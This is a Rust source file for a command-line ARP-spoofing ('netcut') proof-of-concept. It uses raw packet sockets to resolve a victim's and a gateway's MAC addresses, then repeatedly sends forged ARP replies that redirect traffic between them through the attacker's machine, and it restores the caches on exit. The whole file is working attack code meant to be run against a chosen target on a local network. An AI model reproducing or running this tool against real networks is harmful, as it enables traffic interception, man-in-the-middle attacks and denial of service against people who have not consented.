use anyhow::{anyhow, Context, Result};
use clap::Parser;
use libc::{
    c_int, c_void, close, if_nametoindex, ioctl, sendto, setsockopt, socket, sockaddr,
    sockaddr_ll, socklen_t, AF_PACKET, ETH_ALEN, ETH_P_ALL, ETH_P_ARP, IFNAMSIZ, SIOCGIFADDR,
    SIOCGIFHWADDR, SOCK_RAW, SOL_SOCKET, SO_BINDTODEVICE,
};
use log::{debug, error, info, warn};
use std::mem::{size_of, zeroed};
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

// -------- CLI --------

#[derive(Parser, Debug)]
#[command(
    name = "netcut_project",
    version,
    about = "Rust ARP-spoofing/netcut PoC using libc raw sockets"
)]
struct Args {
    /// Interface name (e.g. wlan0, eth0)
    #[arg(short, long)]
    iface: String,

    /// Target IPv4 address (victim)
    #[arg(short, long)]
    target: Ipv4Addr,

    /// Gateway IPv4 address (router)
    #[arg(short, long)]
    gateway: Ipv4Addr,

    /// Send interval in milliseconds
    #[arg(long, default_value_t = 1000)]
    interval_ms: u64,

    /// Also poison the gateway (bidirectional)
    #[arg(long, default_value_t = true)]
    bidirectional: bool,

    /// Max seconds to wait for target/gateway MAC resolution
    #[arg(long, default_value_t = 15)]
    resolve_timeout: u64,
}

// -------- ioctl request type shim --------
// glibc:  ioctl(fd, c_ulong, ...)
// bionic: ioctl(fd, c_int,   ...)
#[cfg(target_env = "gnu")]
type IoctlReq = libc::c_ulong;
#[cfg(not(target_env = "gnu"))]
type IoctlReq = libc::c_int;

// -------- ifreq layout (minimal, portable enough for SIOCGIF*) --------

#[repr(C)]
union IfrIfru {
    ifru_addr: sockaddr,
    ifru_hwaddr: sockaddr,
    ifru_flags: libc::c_short,
    ifru_ivalue: libc::c_int,
    ifru_mtu: libc::c_int,
    ifru_data: *mut c_void,
    _pad: [u8; 24],
}

#[repr(C)]
struct Ifreq {
    ifr_name: [libc::c_char; IFNAMSIZ],
    ifr_ifru: IfrIfru,
}

impl Ifreq {
    fn new(iface: &str) -> Result<Self> {
        if iface.len() >= IFNAMSIZ {
            return Err(anyhow!("interface name too long"));
        }
        let mut req: Ifreq = unsafe { zeroed() };
        // Safe copy: never overflow, always NUL-terminated because zeroed.
        for (i, b) in iface.as_bytes().iter().enumerate() {
            req.ifr_name[i] = *b as libc::c_char;
        }
        Ok(req)
    }
}

// -------- Ethernet / ARP frame --------

#[repr(C, packed)]
#[derive(Clone, Copy)]
struct ArpFrame {
    // Ethernet header
    eth_dst: [u8; 6],
    eth_src: [u8; 6],
    eth_type: u16, // BE: 0x0806
    // ARP payload
    htype: u16, // BE: 1
    ptype: u16, // BE: 0x0800
    hlen: u8,   // 6
    plen: u8,   // 4
    oper: u16,  // BE: 2 (reply) / 1 (request)
    sha: [u8; 6],
    spa: [u8; 4],
    tha: [u8; 6],
    tpa: [u8; 4],
}

impl ArpFrame {
    fn as_bytes(&self) -> &[u8] {
        unsafe {
            std::slice::from_raw_parts(
                (self as *const ArpFrame) as *const u8,
                size_of::<ArpFrame>(),
            )
        }
    }
}

fn build_arp_reply(
    src_mac: [u8; 6],
    dst_mac: [u8; 6],
    spoofed_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
) -> ArpFrame {
    ArpFrame {
        eth_dst: dst_mac,
        eth_src: src_mac,
        eth_type: 0x0806u16.to_be(),
        htype: 1u16.to_be(),
        ptype: 0x0800u16.to_be(),
        hlen: 6,
        plen: 4,
        oper: 2u16.to_be(),
        sha: src_mac,
        spa: spoofed_ip.octets(),
        tha: dst_mac,
        tpa: target_ip.octets(),
    }
}

fn build_arp_request(
    src_mac: [u8; 6],
    sender_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
) -> ArpFrame {
    ArpFrame {
        eth_dst: [0xff; 6],
        eth_src: src_mac,
        eth_type: 0x0806u16.to_be(),
        htype: 1u16.to_be(),
        ptype: 0x0800u16.to_be(),
        hlen: 6,
        plen: 4,
        oper: 1u16.to_be(),
        sha: src_mac,
        spa: sender_ip.octets(),
        tha: [0; 6],
        tpa: target_ip.octets(),
    }
}

// -------- Raw socket helpers --------

struct RawSock {
    fd: c_int,
}

impl RawSock {
    fn new(protocol: u16) -> Result<Self> {
        // Note: socket() protocol arg is c_int; convert BE u16 into i32 explicitly.
        let proto = i32::from(protocol.to_be());
        let fd = unsafe { socket(AF_PACKET, SOCK_RAW, proto) };
        if fd < 0 {
            return Err(std::io::Error::last_os_error()).context("socket(AF_PACKET, SOCK_RAW)");
        }
        Ok(Self { fd })
    }

    fn bind_to_device(&self, iface: &str) -> Result<()> {
        let bytes = iface.as_bytes();
        let rc = unsafe {
            setsockopt(
                self.fd,
                SOL_SOCKET,
                SO_BINDTODEVICE,
                bytes.as_ptr() as *const c_void,
                bytes.len() as socklen_t,
            )
        };
        if rc < 0 {
            return Err(std::io::Error::last_os_error()).context("SO_BINDTODEVICE");
        }
        Ok(())
    }

    fn send_frame(&self, frame: &[u8], ifindex: i32) -> Result<()> {
        let mut sll: sockaddr_ll = unsafe { zeroed() };
        sll.sll_family = AF_PACKET as u16;
        sll.sll_protocol = (ETH_P_ARP as u16).to_be();
        sll.sll_ifindex = ifindex;
        sll.sll_halen = ETH_ALEN as u8;
        // dst MAC copied from frame's ethernet dst
        sll.sll_addr[..6].copy_from_slice(&frame[0..6]);

        let sent = unsafe {
            sendto(
                self.fd,
                frame.as_ptr() as *const c_void,
                frame.len(),
                0,
                &sll as *const sockaddr_ll as *const sockaddr,
                size_of::<sockaddr_ll>() as socklen_t,
            )
        };
        if sent < 0 {
            return Err(std::io::Error::last_os_error()).context("sendto");
        }
        Ok(())
    }
}

impl Drop for RawSock {
    fn drop(&mut self) {
        unsafe { close(self.fd) };
    }
}

// -------- Interface info --------

fn get_iface_mac(iface: &str) -> Result<[u8; 6]> {
    let fd = unsafe { socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
    if fd < 0 {
        return Err(std::io::Error::last_os_error()).context("socket(AF_INET) for ioctl");
    }
    let mut req = Ifreq::new(iface)?;
    let rc = unsafe { ioctl(fd, SIOCGIFHWADDR as IoctlReq, &mut req as *mut _) };
    let err = std::io::Error::last_os_error();
    unsafe { close(fd) };
    if rc < 0 {
        return Err(err).context("SIOCGIFHWADDR");
    }
    let sa = unsafe { &req.ifr_ifru.ifru_hwaddr };
    let mut mac = [0u8; 6];
    for i in 0..6 {
        mac[i] = sa.sa_data[i] as u8;
    }
    Ok(mac)
}

fn get_iface_ipv4(iface: &str) -> Result<Ipv4Addr> {
    let fd = unsafe { socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
    if fd < 0 {
        return Err(std::io::Error::last_os_error()).context("socket(AF_INET) for ioctl");
    }
    let mut req = Ifreq::new(iface)?;
    let rc = unsafe { ioctl(fd, SIOCGIFADDR as IoctlReq, &mut req as *mut _) };
    let err = std::io::Error::last_os_error();
    unsafe { close(fd) };
    if rc < 0 {
        return Err(err).context("SIOCGIFADDR");
    }
    let sa = unsafe { &req.ifr_ifru.ifru_addr };
    // sa_data layout for AF_INET sockaddr: [port(2), addr(4), zero(8)]
    let ip = Ipv4Addr::new(
        sa.sa_data[2] as u8,
        sa.sa_data[3] as u8,
        sa.sa_data[4] as u8,
        sa.sa_data[5] as u8,
    );
    Ok(ip)
}

fn get_iface_index(iface: &str) -> Result<i32> {
    let cname = std::ffi::CString::new(iface).context("iface name has NUL")?;
    let idx = unsafe { if_nametoindex(cname.as_ptr()) };
    if idx == 0 {
        return Err(std::io::Error::last_os_error()).context("if_nametoindex");
    }
    Ok(idx as i32)
}

// -------- ARP resolution via pnet_datalink --------

fn resolve_mac(
    iface: &str,
    our_mac: [u8; 6],
    our_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
    ifindex: i32,
    timeout: Duration,
    stop: &Arc<AtomicBool>,
) -> Result<[u8; 6]> {
    // Reuse one socket for both requests and receives.
    let resolver = RawSock::new(ETH_P_ARP as u16)?;
    resolver.bind_to_device(iface)?;

    // Set a short recv timeout so we can loop and retransmit.
    let tv = libc::timeval {
        tv_sec: 0,
        tv_usec: 250_000,
    };
    unsafe {
        setsockopt(
            resolver.fd,
            SOL_SOCKET,
            libc::SO_RCVTIMEO,
            &tv as *const _ as *const c_void,
            size_of::<libc::timeval>() as socklen_t,
        );
    }

    let req = build_arp_request(our_mac, our_ip, target_ip);
    let deadline = Instant::now() + timeout;
    let mut last_send = Instant::now() - Duration::from_secs(60);
    let mut buf = [0u8; 1500];

    while Instant::now() < deadline && !stop.load(Ordering::Relaxed) {
        if last_send.elapsed() >= Duration::from_millis(500) {
            if let Err(e) = resolver.send_frame(req.as_bytes(), ifindex) {
                warn!("ARP request send error: {e}");
            }
            last_send = Instant::now();
        }

        let n = unsafe {
            libc::recv(
                resolver.fd,
                buf.as_mut_ptr() as *mut c_void,
                buf.len(),
                0,
            )
        };
        if n < 0 {
            let e = std::io::Error::last_os_error();
            if let Some(code) = e.raw_os_error() {
                if code == libc::EAGAIN || code == libc::EWOULDBLOCK || code == libc::EINTR {
                    continue;
                }
            }
            return Err(e).context("recv while resolving MAC");
        }
        let n = n as usize;
        if n < size_of::<ArpFrame>() {
            continue;
        }
        // Parse ARP reply
        let eth_type = u16::from_be_bytes([buf[12], buf[13]]);
        if eth_type != 0x0806 {
            continue;
        }
        let oper = u16::from_be_bytes([buf[20], buf[21]]);
        if oper != 2 {
            continue;
        }
        let spa = Ipv4Addr::new(buf[28], buf[29], buf[30], buf[31]);
        if spa != target_ip {
            continue;
        }
        let mut mac = [0u8; 6];
        mac.copy_from_slice(&buf[22..28]);
        return Ok(mac);
    }

    Err(anyhow!("timed out resolving MAC for {}", target_ip))
}

// -------- Main spoofing loop --------

fn spoof_loop(
    sock: &RawSock,
    ifindex: i32,
    frames: &[ArpFrame],
    interval: Duration,
    stop: &Arc<AtomicBool>,
) {
    // Responsive shutdown: split the interval into short sleeps.
    let tick = Duration::from_millis(50);
    while !stop.load(Ordering::Acquire) {
        for f in frames {
            if let Err(e) = sock.send_frame(f.as_bytes(), ifindex) {
                error!("send_frame failed: {e}");
            }
        }
        let mut waited = Duration::ZERO;
        while waited < interval && !stop.load(Ordering::Acquire) {
            thread::sleep(tick);
            waited += tick;
        }
    }
}

fn format_mac(m: &[u8; 6]) -> String {
    format!(
        "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
        m[0], m[1], m[2], m[3], m[4], m[5]
    )
}

fn main() -> Result<()> {
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
    let args = Args::parse();

    // Suppress unused-import warning on some targets.
    let _ = ETH_P_ALL;

    let ifindex = get_iface_index(&args.iface)?;
    let our_mac = get_iface_mac(&args.iface)?;
    let our_ip = get_iface_ipv4(&args.iface)?;
    info!(
        "iface={} ifindex={} mac={} ip={}",
        args.iface,
        ifindex,
        format_mac(&our_mac),
        our_ip
    );

    // Shutdown signaling
    let stop = Arc::new(AtomicBool::new(false));
    {
        let stop = Arc::clone(&stop);
        ctrlc::set_handler(move || {
            warn!("Ctrl+C received, shutting down...");
            stop.store(true, Ordering::Release);
        })
        .context("installing Ctrl+C handler")?;
    }

    // Resolve MACs
    let timeout = Duration::from_secs(args.resolve_timeout);
    let target_mac = resolve_mac(
        &args.iface,
        our_mac,
        our_ip,
        args.target,
        ifindex,
        timeout,
        &stop,
    )
    .with_context(|| format!("resolving MAC of target {}", args.target))?;
    info!("target {} -> {}", args.target, format_mac(&target_mac));

    let gateway_mac = resolve_mac(
        &args.iface,
        our_mac,
        our_ip,
        args.gateway,
        ifindex,
        timeout,
        &stop,
    )
    .with_context(|| format!("resolving MAC of gateway {}", args.gateway))?;
    info!("gateway {} -> {}", args.gateway, format_mac(&gateway_mac));

    // Prebuild frames once (hot loop stays allocation-free)
    let mut frames: Vec<ArpFrame> = Vec::with_capacity(2);
    // Tell target: "gateway is at OUR mac"
    frames.push(build_arp_reply(our_mac, target_mac, args.gateway, args.target));
    if args.bidirectional {
        // Tell gateway: "target is at OUR mac"
        frames.push(build_arp_reply(our_mac, gateway_mac, args.target, args.gateway));
    }

    // Sending socket
    let sock = RawSock::new(ETH_P_ARP as u16)?;
    sock.bind_to_device(&args.iface)?;

    info!(
        "spoofing every {} ms (bidirectional={})",
        args.interval_ms, args.bidirectional
    );
    debug!("frames prebuilt: {}", frames.len());

    spoof_loop(
        &sock,
        ifindex,
        &frames,
        Duration::from_millis(args.interval_ms),
        &stop,
    );

    // Restore ARP caches: send correct mappings a few times.
    info!("restoring ARP caches...");
    let restore_target = build_arp_reply(gateway_mac, target_mac, args.gateway, args.target);
    let restore_gateway = build_arp_reply(target_mac, gateway_mac, args.target, args.gateway);
    for _ in 0..5 {
        let _ = sock.send_frame(restore_target.as_bytes(), ifindex);
        if args.bidirectional {
            let _ = sock.send_frame(restore_gateway.as_bytes(), ifindex);
        }
        thread::sleep(Duration::from_millis(200));
    }

    info!("done.");
    Ok(())
}